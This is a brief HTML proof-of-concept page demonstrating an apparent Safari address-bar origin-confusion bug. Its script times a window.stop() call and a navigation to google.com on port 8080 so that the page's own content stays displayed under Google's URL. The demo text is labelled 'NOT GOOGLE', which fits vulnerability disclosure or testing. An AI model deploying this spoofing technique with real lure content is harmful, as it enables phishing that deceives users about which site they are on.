<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Safari Transient Origin PoC</title>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  background: #b00000;
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: -apple-system, sans-serif;
  font-size: 48px;
  text-align: center;
}
#origin {
  position: fixed;
  bottom: 10px;
  font-size: 14px;
}
</style>
</head>

<body>
<div>
  NOT GOOGLE<br>
  Origin Confusion Demo
</div>
<div id="origin">Origin: ecdnts-del.github.io</div>

<script>
function strongPoC() {

  // PHASE 1 — tunggu browser selesai paint (penting di Safari)
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {

      // PHASE 2 — beri delay kecil supaya teks benar-benar terlihat
      setTimeout(() => {

        // hentikan loading (Safari tetap render halaman lama)
        window.stop();

        // PHASE 3 — commit top-level navigation
        location.href = "https://google.com:8080";

        console.log("Navigation committed, old content still rendered");

      }, 300); // sweet spot Safari (200–400ms)

    });
  });
}

strongPoC();
</script>
</body>
</html>
